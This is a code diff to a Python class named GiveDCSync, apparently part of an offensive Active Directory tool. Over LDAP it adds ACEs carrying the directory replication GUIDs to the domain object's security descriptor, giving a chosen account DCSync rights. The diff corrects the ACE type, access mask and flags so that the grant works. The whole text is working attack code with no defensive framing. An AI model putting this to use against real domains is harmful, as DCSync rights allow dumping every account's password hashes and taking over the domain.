@@ -34,13 +34,12 @@ class GiveDCSync:
         self.connect()
 
         logging.info("Granted object will be: %s" % self.granted.get("distinguishedName"))
-        self.security_descriptor["Dacl"].aces.append(self.create_allow_ace(self.granted.get_raw("objectSid"), '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2'))
-        self.security_descriptor["Dacl"].aces.append(self.create_allow_ace(self.granted.get_raw("objectSid"), '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2'))
-
+        self.security_descriptor["Dacl"].aces.append(self.create_object_ace(self.granted.get_raw("objectSid"), '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2'))
+        self.security_descriptor["Dacl"].aces.append(self.create_object_ace(self.granted.get_raw("objectSid"), '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2'))
         ret = self.write(self.domain.get("distinguishedName"),  {'nTSecurityDescriptor':[ldap3.MODIFY_REPLACE, [self.security_descriptor.getData()]]})
 
         if ret['result'] == 0:
-            logging.info("Granted GENERIC_ALL successfully !")
+            logging.info("Granted DCSync rights successfully !")
         else :
             if ret['result'] == 50:
                 raise Exception('Could not modify object, the server reports insufficient rights: %s', ret['message'])
@@ -111,16 +110,17 @@ class GiveDCSync:
 
         return self.security_descriptor
 
-    def create_allow_ace(self, sid: bytes, guid: str):    
+    def create_object_ace(self, sid: bytes, guid: str):    
         nace = ACE()
-        nace['AceType'] = ACCESS_ALLOWED_ACE.ACE_TYPE
+        nace['AceType'] = ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE
         nace['AceFlags'] = 0x00
         acedata = ACCESS_ALLOWED_OBJECT_ACE()
         acedata['Mask'] = ACCESS_MASK()
-        acedata['Mask']['Mask'] = 256 # DS Control Rights
+        acedata['Mask']['Mask'] = ACCESS_ALLOWED_OBJECT_ACE.ADS_RIGHT_DS_CONTROL_ACCESS
         acedata['Sid'] = LDAP_SID(sid)
         acedata['ObjectType'] = string_to_bin(guid)
-        acedata['Flags'] = 0x01
+        acedata['InheritedObjectType'] = b''
+        acedata['Flags'] = ACCESS_ALLOWED_OBJECT_ACE.ACE_OBJECT_TYPE_PRESENT
         nace['Ace'] = acedata
         return nace
 
